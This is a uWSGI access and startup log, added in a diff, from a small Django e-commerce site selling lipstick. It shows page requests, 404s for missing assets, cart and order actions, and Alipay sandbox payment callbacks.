+[pid: 27369|app: 0|req: 94/94] 47.100.100.21 () {34 vars in 1800 bytes} [Sun Mar 17 23:18:34 2019] GET /returnurl/?charset=utf-8&out_trade_no=1552826834.90470849787&method=alipay.trade.page.pay.return&total_amount=42.00&sign=ho1bq4%2fnxp3cmfd3qg5s2cbiryavxjqblrlimxqnztzq9makjd%2felc%2fx6xytsb1xfhlk%2fh2lvarvovnufkpkwpsp%2baqi4zsrnwno7hnvr5jftnlz45lma4rgl9pzxqjgyuajgkindekenz2wevfdpenq5hcsehqktwlhdmtvqotmx4ecmf6yhweaerfgr3a3nzqr4ftjsrjanmveyon2gy%2but%2baiuhdoikygplmokax3xtxnz%2fn6kpwawwfocsizad%2beqfgokpo5hsshn2zckfm5fgeo9ceqqknxajw7sueivjjkrfduncpyyr%2fnizx6gxkwsdawvkcr%2fwzwkdplka%3d%3d&trade_no=2019031722001438721000002024&auth_app_id=2016092800612147&version=1.0&app_id=2016092800612147&sign_type=rsa2&seller_id=2088102177580591&timestamp=2019-03-17+20%3a48%3a09 => generated 0 bytes in 1 msecs (HTTP/1.1 302) 4 headers in 123 bytes (1 switches on core 0)
+[pid: 27369|app: 0|req: 95/95] 47.100.100.21 () {34 vars in 461 bytes} [Sun Mar 17 23:18:34 2019] GET / => generated 66081 bytes in 14 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+[pid: 27369|app: 0|req: 96/96] 106.14.190.222 () {34 vars in 476 bytes} [Sun Mar 17 23:24:49 2019] GET /list/1/ => generated 128264 bytes in 12 msecs (HTTP/1.1 200) 4 headers in 126 bytes (1 switches on core 0)
+[pid: 27369|app: 0|req: 97/97] 47.92.75.171 () {34 vars in 474 bytes} [Sun Mar 17 23:34:36 2019] GET /list/3/ => generated 128264 bytes in 11 msecs (HTTP/1.1 200) 4 headers in 126 bytes (1 switches on core 0)
+[pid: 27369|app: 0|req: 98/98] 39.107.116.226 () {34 vars in 462 bytes} [Sun Mar 17 23:41:39 2019] GET / => generated 66081 bytes in 13 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+Not Found: /axf/cart/
+[pid: 27369|app: 0|req: 99/99] 59.55.101.9 () {38 vars in 629 bytes} [Sun Mar 17 23:52:33 2019] GET /axf/cart/ => generated 5125 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+[pid: 27369|app: 0|req: 100/100] 113.87.160.176 () {44 vars in 1255 bytes} [Mon Mar 18 00:09:44 2019] GET / => generated 66060 bytes in 17 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+Not Found: /images/index/fold.jpg
+[pid: 27369|app: 0|req: 101/101] 113.87.160.176 () {42 vars in 1230 bytes} [Mon Mar 18 00:09:45 2019] GET /images/index/fold.jpg => generated 5161 bytes in 5 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /images/index/unfold.jpg
+[pid: 27369|app: 0|req: 102/102] 113.88.14.120 () {42 vars in 1233 bytes} [Mon Mar 18 00:09:45 2019] GET /images/index/unfold.jpg => generated 5167 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /json/toutiao.json
+[pid: 27369|app: 0|req: 103/103] 113.87.160.176 () {44 vars in 1225 bytes} [Mon Mar 18 00:09:45 2019] GET /json/toutiao.json => generated 5149 bytes in 5 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /json/playimg.json
+[pid: 27369|app: 0|req: 104/104] 113.88.14.120 () {44 vars in 1224 bytes} [Mon Mar 18 00:09:45 2019] GET /json/playimg.json => generated 5149 bytes in 5 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /json/newgoods.json
+[pid: 27369|app: 0|req: 105/105] 113.87.160.176 () {44 vars in 1227 bytes} [Mon Mar 18 00:09:45 2019] GET /json/newgoods.json => generated 5152 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /favicon.ico
+[pid: 27369|app: 0|req: 106/106] 113.87.160.176 () {42 vars in 1210 bytes} [Mon Mar 18 00:09:45 2019] GET /favicon.ico => generated 5131 bytes in 5 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+[pid: 27369|app: 0|req: 107/107] 113.87.160.176 () {44 vars in 1279 bytes} [Mon Mar 18 00:09:50 2019] GET /cart/ => generated 29780 bytes in 10 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+[pid: 27369|app: 0|req: 108/108] 113.87.160.176 () {44 vars in 1279 bytes} [Mon Mar 18 00:11:41 2019] GET /list/ => generated 128243 bytes in 14 msecs (HTTP/1.1 200) 4 headers in 126 bytes (1 switches on core 0)
+Not Found: /list/json/kouhong.json
+[pid: 27369|app: 0|req: 109/109] 113.88.14.120 () {44 vars in 1239 bytes} [Mon Mar 18 00:11:41 2019] GET /list/json/kouhong.json => generated 5164 bytes in 5 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+4
+cart is not exist
+[pid: 27369|app: 0|req: 110/110] 113.88.14.120 () {44 vars in 1230 bytes} [Mon Mar 18 00:11:51 2019] GET /addcart/?goodsid=4 => generated 13 bytes in 11 msecs (HTTP/1.1 200) 4 headers in 114 bytes (1 switches on core 0)
+3
+cart is not exist
+[pid: 27369|app: 0|req: 111/111] 113.88.14.120 () {44 vars in 1230 bytes} [Mon Mar 18 00:11:52 2019] GET /addcart/?goodsid=3 => generated 13 bytes in 14 msecs (HTTP/1.1 200) 4 headers in 114 bytes (1 switches on core 0)
+2
+cart is not exist
+[pid: 27369|app: 0|req: 112/112] 113.88.14.120 () {44 vars in 1230 bytes} [Mon Mar 18 00:11:53 2019] GET /addcart/?goodsid=2 => generated 13 bytes in 12 msecs (HTTP/1.1 200) 4 headers in 114 bytes (1 switches on core 0)
+[pid: 27369|app: 0|req: 113/113] 113.88.14.120 () {44 vars in 1283 bytes} [Mon Mar 18 00:11:57 2019] GET /cart/ => generated 36556 bytes in 15 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+4
+cart exist
+[pid: 27369|app: 0|req: 114/114] 113.88.14.120 () {44 vars in 1230 bytes} [Mon Mar 18 00:11:59 2019] GET /addcart/?goodsid=4 => generated 31 bytes in 11 msecs (HTTP/1.1 200) 4 headers in 114 bytes (1 switches on core 0)
+4
+cart exist
+[pid: 27369|app: 0|req: 115/115] 113.88.14.120 () {44 vars in 1230 bytes} [Mon Mar 18 00:11:59 2019] GET /addcart/?goodsid=4 => generated 31 bytes in 13 msecs (HTTP/1.1 200) 4 headers in 114 bytes (1 switches on core 0)
+4
+cart exist
+[pid: 27369|app: 0|req: 116/116] 113.88.14.120 () {44 vars in 1230 bytes} [Mon Mar 18 00:12:00 2019] GET /addcart/?goodsid=4 => generated 31 bytes in 12 msecs (HTTP/1.1 200) 4 headers in 114 bytes (1 switches on core 0)
+3
+cart exist
+[pid: 27369|app: 0|req: 117/117] 113.88.14.120 () {44 vars in 1230 bytes} [Mon Mar 18 00:12:01 2019] GET /addcart/?goodsid=3 => generated 31 bytes in 13 msecs (HTTP/1.1 200) 4 headers in 114 bytes (1 switches on core 0)
+3
+cart exist
+[pid: 27369|app: 0|req: 118/118] 113.88.14.120 () {44 vars in 1230 bytes} [Mon Mar 18 00:12:01 2019] GET /addcart/?goodsid=3 => generated 31 bytes in 11 msecs (HTTP/1.1 200) 4 headers in 114 bytes (1 switches on core 0)
+3
+cart exist
+[pid: 27369|app: 0|req: 119/119] 113.88.14.120 () {44 vars in 1230 bytes} [Mon Mar 18 00:12:01 2019] GET /addcart/?goodsid=3 => generated 31 bytes in 13 msecs (HTTP/1.1 200) 4 headers in 114 bytes (1 switches on core 0)
+2
+cart exist
+[pid: 27369|app: 0|req: 120/120] 113.88.14.120 () {44 vars in 1230 bytes} [Mon Mar 18 00:12:02 2019] GET /addcart/?goodsid=2 => generated 31 bytes in 14 msecs (HTTP/1.1 200) 4 headers in 114 bytes (1 switches on core 0)
+0
+change to 1
+[pid: 27369|app: 0|req: 121/121] 113.88.14.120 () {44 vars in 1262 bytes} [Mon Mar 18 00:12:03 2019] GET /changeselect/?isselect=1&goodsid=4 => generated 2 bytes in 12 msecs (HTTP/1.1 200) 4 headers in 113 bytes (1 switches on core 0)
+0
+change to 1
+[pid: 27369|app: 0|req: 122/122] 113.88.14.120 () {44 vars in 1262 bytes} [Mon Mar 18 00:12:04 2019] GET /changeselect/?isselect=1&goodsid=3 => generated 2 bytes in 12 msecs (HTTP/1.1 200) 4 headers in 113 bytes (1 switches on core 0)
+0
+change to 1
+[pid: 27369|app: 0|req: 123/123] 113.88.14.120 () {44 vars in 1262 bytes} [Mon Mar 18 00:12:04 2019] GET /changeselect/?isselect=1&goodsid=2 => generated 2 bytes in 13 msecs (HTTP/1.1 200) 4 headers in 113 bytes (1 switches on core 0)
+[pid: 27369|app: 0|req: 124/124] 113.88.14.120 () {44 vars in 1301 bytes} [Mon Mar 18 00:12:15 2019] GET /generateorder/ => generated 13907 bytes in 56 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+米蔻丰盈炫彩女神款口红 (嫣玫色）X4|医朵eto咬唇妆口红膏1号4.2g X4|医朵eto咬唇妆口红膏2号4.2g X2|
+[pid: 27369|app: 0|req: 125/125] 113.88.14.120 () {44 vars in 1233 bytes} [Mon Mar 18 00:12:23 2019] GET /pay/?orderid=26 => generated 1217 bytes in 11 msecs (HTTP/1.1 200) 3 headers in 102 bytes (1 switches on core 0)
+[pid: 27369|app: 0|req: 126/126] 203.209.240.5 () {34 vars in 493 bytes} [Mon Mar 18 00:13:25 2019] POST /appnotifyurl/ => generated 18 bytes in 1 msecs (HTTP/1.1 200) 3 headers in 100 bytes (1 switches on core 0)
+[pid: 27369|app: 0|req: 127/127] 113.87.160.176 () {44 vars in 2811 bytes} [Mon Mar 18 00:13:35 2019] GET /returnurl/?charset=utf-8&out_trade_no=1552867935.86226343804&method=alipay.trade.page.pay.return&total_amount=642.00&sign=qJLIQbgn%2B3A%2F7FYxQevxD6d7Tg%2Fa%2B%2BV63922feaS4yFum%2F7CqD7%2Bk3Twx8hXBUYh4kAgzwLlvV%2BWEdxpVgXRo%2FKM8VqCX1ibSZ4UMXM428OEs3EgYdvtEX3byykYhHFwFpIaDzZnU6pTHWETZJYd0Tsm0%2Fgs1cZdBH6fw4XI06C1s6PgORAz0a8NADMhQypXuZE953IschlHpNv42738CRLUeWKSl%2F2BBZRydnQdCJQ024OQtL7DrBeNU8ZcxeCg9HVfVoOJmafU5J5sE4Tf3wCD6sbj%2Bd4Y6Mq7vPYOvKXyMvA0nBgrb%2FZE43ge9blLM6cA4ZRFbjSAJ4CFjgH%2FPg%3D%3D&trade_no=2019031822001445641000000001&auth_app_id=2016092800612147&version=1.0&app_id=2016092800612147&sign_type=RSA2&seller_id=2088102177580591&timestamp=2019-03-18+08%3A13%3A31 => generated 0 bytes in 1 msecs (HTTP/1.1 302) 4 headers in 123 bytes (1 switches on core 0)
+[pid: 27369|app: 0|req: 128/128] 113.87.160.176 () {44 vars in 1458 bytes} [Mon Mar 18 00:13:35 2019] GET / => generated 66060 bytes in 17 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+Not Found: /images/index/fold.jpg
+[pid: 27369|app: 0|req: 129/129] 113.88.14.120 () {42 vars in 1229 bytes} [Mon Mar 18 00:13:35 2019] GET /images/index/fold.jpg => generated 5161 bytes in 5 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /images/index/unfold.jpg
+[pid: 27369|app: 0|req: 130/130] 113.87.160.176 () {42 vars in 1234 bytes} [Mon Mar 18 00:13:35 2019] GET /images/index/unfold.jpg => generated 5167 bytes in 5 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /json/playimg.json
+[pid: 27369|app: 0|req: 131/131] 113.87.160.176 () {44 vars in 1225 bytes} [Mon Mar 18 00:13:35 2019] GET /json/playimg.json => generated 5149 bytes in 6 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /json/toutiao.json
+[pid: 27369|app: 0|req: 132/132] 113.88.14.120 () {44 vars in 1224 bytes} [Mon Mar 18 00:13:35 2019] GET /json/toutiao.json => generated 5149 bytes in 5 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /json/newgoods.json
+[pid: 27369|app: 0|req: 133/133] 113.87.160.176 () {44 vars in 1227 bytes} [Mon Mar 18 00:13:35 2019] GET /json/newgoods.json => generated 5152 bytes in 5 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+[pid: 27369|app: 0|req: 134/134] 47.92.99.247 () {34 vars in 460 bytes} [Mon Mar 18 00:36:01 2019] GET / => generated 66081 bytes in 13 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+*** Starting uWSGI 2.0.18 (64bit) on [Mon Mar 18 08:45:46 2019] ***
+compiled with version: 5.4.0 20160609 on 13 March 2019 09:02:17
+os: Linux-4.4.0-93-generic #116-Ubuntu SMP Fri Aug 11 21:17:51 UTC 2017
+nodename: iZjlynlmysim61Z
+machine: x86_64
+clock source: unix
+detected number of CPU cores: 1
+current working directory: /var/www/zwyz
+writing pidfile to uwsgi.pid
+detected binary path: /root/.virtualenvs/ZWYZ/bin/uwsgi
+!!! no internal routing support, rebuild with pcre support !!!
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /var/www/zwyz/
+*** WARNING: you are running uWSGI without its master process manager ***
+your processes number limit is 7857
+your memory page size is 4096 bytes
+detected max file descriptor number: 65535
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to TCP address 0.0.0.0:8020 fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.5.2 (default, Nov 12 2018, 13:43:14)  [GCC 5.4.0 20160609]
+*** Python threads support is disabled. You can enable it with --enable-threads ***
+Python main interpreter initialized at 0xe16fa0
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 72904 bytes (71 KB) for 1 cores
+*** Operational MODE: single process ***
+WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0xe16fa0 pid: 31375 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI worker 1 (and the only) (pid: 31375, cores: 1)
+[pid: 31375|app: 0|req: 1/1] 113.88.14.120 () {44 vars in 1261 bytes} [Mon Mar 18 00:45:58 2019] GET / => generated 66063 bytes in 230 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+Not Found: /images/index/unfold.jpg
+[pid: 31375|app: 0|req: 2/2] 113.88.14.120 () {42 vars in 1233 bytes} [Mon Mar 18 00:45:58 2019] GET /images/index/unfold.jpg => generated 5167 bytes in 6 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /images/index/fold.jpg
+[pid: 31375|app: 0|req: 3/3] 113.87.160.176 () {42 vars in 1230 bytes} [Mon Mar 18 00:45:58 2019] GET /images/index/fold.jpg => generated 5161 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /json/playimg.json
+[pid: 31375|app: 0|req: 4/4] 113.87.160.176 () {44 vars in 1225 bytes} [Mon Mar 18 00:45:58 2019] GET /json/playimg.json => generated 5149 bytes in 5 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /json/toutiao.json
+[pid: 31375|app: 0|req: 5/5] 113.88.14.120 () {44 vars in 1224 bytes} [Mon Mar 18 00:45:58 2019] GET /json/toutiao.json => generated 5149 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /json/newgoods.json
+[pid: 31375|app: 0|req: 6/6] 113.87.160.176 () {44 vars in 1227 bytes} [Mon Mar 18 00:45:58 2019] GET /json/newgoods.json => generated 5152 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+[pid: 31375|app: 0|req: 7/7] 113.87.160.176 () {44 vars in 1262 bytes} [Mon Mar 18 00:46:00 2019] GET / => generated 66063 bytes in 17 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+Not Found: /images/index/unfold.jpg
+[pid: 31375|app: 0|req: 8/8] 113.88.14.120 () {42 vars in 1233 bytes} [Mon Mar 18 00:46:00 2019] GET /images/index/unfold.jpg => generated 5167 bytes in 5 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /images/index/fold.jpg
+[pid: 31375|app: 0|req: 9/9] 113.87.160.176 () {42 vars in 1230 bytes} [Mon Mar 18 00:46:00 2019] GET /images/index/fold.jpg => generated 5161 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /json/toutiao.json
+[pid: 31375|app: 0|req: 10/10] 113.88.14.120 () {44 vars in 1224 bytes} [Mon Mar 18 00:46:01 2019] GET /json/toutiao.json => generated 5149 bytes in 6 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /json/playimg.json
+[pid: 31375|app: 0|req: 11/11] 113.87.160.176 () {44 vars in 1225 bytes} [Mon Mar 18 00:46:01 2019] GET /json/playimg.json => generated 5149 bytes in 5 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /json/newgoods.json
+[pid: 31375|app: 0|req: 12/12] 113.88.14.120 () {44 vars in 1226 bytes} [Mon Mar 18 00:46:01 2019] GET /json/newgoods.json => generated 5152 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+[pid: 31375|app: 0|req: 13/13] 113.88.14.120 () {44 vars in 1261 bytes} [Mon Mar 18 00:46:01 2019] GET / => generated 66063 bytes in 17 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+Not Found: /images/index/unfold.jpg
+[pid: 31375|app: 0|req: 14/14] 113.88.14.120 () {42 vars in 1233 bytes} [Mon Mar 18 00:46:01 2019] GET /images/index/unfold.jpg => generated 5167 bytes in 5 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /images/index/fold.jpg
+[pid: 31375|app: 0|req: 15/15] 113.87.160.176 () {42 vars in 1230 bytes} [Mon Mar 18 00:46:01 2019] GET /images/index/fold.jpg => generated 5161 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /json/toutiao.json
+[pid: 31375|app: 0|req: 16/16] 113.88.14.120 () {44 vars in 1224 bytes} [Mon Mar 18 00:46:01 2019] GET /json/toutiao.json => generated 5149 bytes in 5 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /json/playimg.json
+[pid: 31375|app: 0|req: 17/17] 113.87.160.176 () {44 vars in 1225 bytes} [Mon Mar 18 00:46:01 2019] GET /json/playimg.json => generated 5149 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /json/newgoods.json
+[pid: 31375|app: 0|req: 18/18] 113.88.14.120 () {44 vars in 1226 bytes} [Mon Mar 18 00:46:01 2019] GET /json/newgoods.json => generated 5152 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+[pid: 31375|app: 0|req: 19/19] 113.88.14.120 () {44 vars in 1261 bytes} [Mon Mar 18 00:46:02 2019] GET / => generated 66063 bytes in 16 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+Not Found: /images/index/unfold.jpg
+[pid: 31375|app: 0|req: 20/20] 113.88.14.120 () {42 vars in 1233 bytes} [Mon Mar 18 00:46:02 2019] GET /images/index/unfold.jpg => generated 5167 bytes in 5 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /images/index/fold.jpg
+[pid: 31375|app: 0|req: 21/21] 113.87.160.176 () {42 vars in 1230 bytes} [Mon Mar 18 00:46:02 2019] GET /images/index/fold.jpg => generated 5161 bytes in 5 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /json/toutiao.json
+[pid: 31375|app: 0|req: 22/22] 113.88.14.120 () {44 vars in 1224 bytes} [Mon Mar 18 00:46:02 2019] GET /json/toutiao.json => generated 5149 bytes in 5 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /json/playimg.json
+[pid: 31375|app: 0|req: 23/23] 113.87.160.176 () {44 vars in 1225 bytes} [Mon Mar 18 00:46:02 2019] GET /json/playimg.json => generated 5149 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /json/newgoods.json
+[pid: 31375|app: 0|req: 24/24] 113.88.14.120 () {44 vars in 1226 bytes} [Mon Mar 18 00:46:02 2019] GET /json/newgoods.json => generated 5152 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+[pid: 31375|app: 0|req: 25/25] 113.88.14.120 () {44 vars in 1261 bytes} [Mon Mar 18 00:46:02 2019] GET / => generated 66063 bytes in 16 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+Not Found: /images/index/fold.jpg
+[pid: 31375|app: 0|req: 26/26] 113.88.14.120 () {42 vars in 1229 bytes} [Mon Mar 18 00:46:03 2019] GET /images/index/fold.jpg => generated 5161 bytes in 5 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /images/index/unfold.jpg
+[pid: 31375|app: 0|req: 27/27] 113.87.160.176 () {42 vars in 1234 bytes} [Mon Mar 18 00:46:03 2019] GET /images/index/unfold.jpg => generated 5167 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /json/toutiao.json
+[pid: 31375|app: 0|req: 28/28] 113.88.14.120 () {44 vars in 1224 bytes} [Mon Mar 18 00:46:03 2019] GET /json/toutiao.json => generated 5149 bytes in 5 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /json/playimg.json
+[pid: 31375|app: 0|req: 29/29] 113.87.160.176 () {44 vars in 1225 bytes} [Mon Mar 18 00:46:03 2019] GET /json/playimg.json => generated 5149 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /json/newgoods.json
+[pid: 31375|app: 0|req: 30/30] 113.88.14.120 () {44 vars in 1226 bytes} [Mon Mar 18 00:46:03 2019] GET /json/newgoods.json => generated 5152 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+[pid: 31375|app: 0|req: 31/31] 113.88.14.120 () {44 vars in 1261 bytes} [Mon Mar 18 00:46:03 2019] GET / => generated 66063 bytes in 17 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+Not Found: /images/index/fold.jpg
+[pid: 31375|app: 0|req: 32/32] 113.88.14.120 () {42 vars in 1229 bytes} [Mon Mar 18 00:46:03 2019] GET /images/index/fold.jpg => generated 5161 bytes in 5 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /images/index/unfold.jpg
+[pid: 31375|app: 0|req: 33/33] 113.87.160.176 () {42 vars in 1234 bytes} [Mon Mar 18 00:46:03 2019] GET /images/index/unfold.jpg => generated 5167 bytes in 5 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /json/toutiao.json
+[pid: 31375|app: 0|req: 34/34] 113.88.14.120 () {44 vars in 1224 bytes} [Mon Mar 18 00:46:03 2019] GET /json/toutiao.json => generated 5149 bytes in 5 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /json/playimg.json
+[pid: 31375|app: 0|req: 35/35] 113.87.160.176 () {44 vars in 1225 bytes} [Mon Mar 18 00:46:03 2019] GET /json/playimg.json => generated 5149 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /json/newgoods.json
+[pid: 31375|app: 0|req: 36/36] 113.88.14.120 () {44 vars in 1226 bytes} [Mon Mar 18 00:46:03 2019] GET /json/newgoods.json => generated 5152 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+[pid: 31375|app: 0|req: 37/37] 113.88.14.120 () {44 vars in 1261 bytes} [Mon Mar 18 00:46:03 2019] GET / => generated 66063 bytes in 16 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+Not Found: /images/index/unfold.jpg
+[pid: 31375|app: 0|req: 38/38] 113.88.14.120 () {42 vars in 1233 bytes} [Mon Mar 18 00:46:03 2019] GET /images/index/unfold.jpg => generated 5167 bytes in 6 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /images/index/fold.jpg
+[pid: 31375|app: 0|req: 39/39] 113.87.160.176 () {42 vars in 1230 bytes} [Mon Mar 18 00:46:03 2019] GET /images/index/fold.jpg => generated 5161 bytes in 5 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /json/toutiao.json
+[pid: 31375|app: 0|req: 40/40] 113.88.14.120 () {44 vars in 1224 bytes} [Mon Mar 18 00:46:03 2019] GET /json/toutiao.json => generated 5149 bytes in 5 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /json/playimg.json
+[pid: 31375|app: 0|req: 41/41] 113.87.160.176 () {44 vars in 1225 bytes} [Mon Mar 18 00:46:03 2019] GET /json/playimg.json => generated 5149 bytes in 5 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /json/newgoods.json
+[pid: 31375|app: 0|req: 42/42] 113.88.14.120 () {44 vars in 1226 bytes} [Mon Mar 18 00:46:03 2019] GET /json/newgoods.json => generated 5152 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+[pid: 31375|app: 0|req: 43/43] 113.88.14.120 () {44 vars in 1261 bytes} [Mon Mar 18 00:46:04 2019] GET / => generated 66063 bytes in 16 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+Not Found: /images/index/unfold.jpg
+[pid: 31375|app: 0|req: 44/44] 113.88.14.120 () {42 vars in 1233 bytes} [Mon Mar 18 00:46:04 2019] GET /images/index/unfold.jpg => generated 5167 bytes in 5 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /images/index/fold.jpg
+[pid: 31375|app: 0|req: 45/45] 113.87.160.176 () {42 vars in 1230 bytes} [Mon Mar 18 00:46:04 2019] GET /images/index/fold.jpg => generated 5161 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /json/toutiao.json
+[pid: 31375|app: 0|req: 46/46] 113.88.14.120 () {44 vars in 1224 bytes} [Mon Mar 18 00:46:04 2019] GET /json/toutiao.json => generated 5149 bytes in 5 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /json/playimg.json
+[pid: 31375|app: 0|req: 47/47] 113.87.160.176 () {44 vars in 1225 bytes} [Mon Mar 18 00:46:04 2019] GET /json/playimg.json => generated 5149 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /json/newgoods.json
+[pid: 31375|app: 0|req: 48/48] 113.88.14.120 () {44 vars in 1226 bytes} [Mon Mar 18 00:46:04 2019] GET /json/newgoods.json => generated 5152 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+[pid: 31375|app: 0|req: 49/49] 113.88.14.120 () {44 vars in 1261 bytes} [Mon Mar 18 00:46:04 2019] GET / => generated 66063 bytes in 15 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+Not Found: /images/index/unfold.jpg
+[pid: 31375|app: 0|req: 50/50] 113.88.14.120 () {42 vars in 1233 bytes} [Mon Mar 18 00:46:04 2019] GET /images/index/unfold.jpg => generated 5167 bytes in 5 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /images/index/fold.jpg
+[pid: 31375|app: 0|req: 51/51] 113.87.160.176 () {42 vars in 1230 bytes} [Mon Mar 18 00:46:04 2019] GET /images/index/fold.jpg => generated 5161 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /json/toutiao.json
+[pid: 31375|app: 0|req: 52/52] 113.88.14.120 () {44 vars in 1224 bytes} [Mon Mar 18 00:46:04 2019] GET /json/toutiao.json => generated 5149 bytes in 5 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /json/playimg.json
+[pid: 31375|app: 0|req: 53/53] 113.87.160.176 () {44 vars in 1225 bytes} [Mon Mar 18 00:46:04 2019] GET /json/playimg.json => generated 5149 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /json/newgoods.json
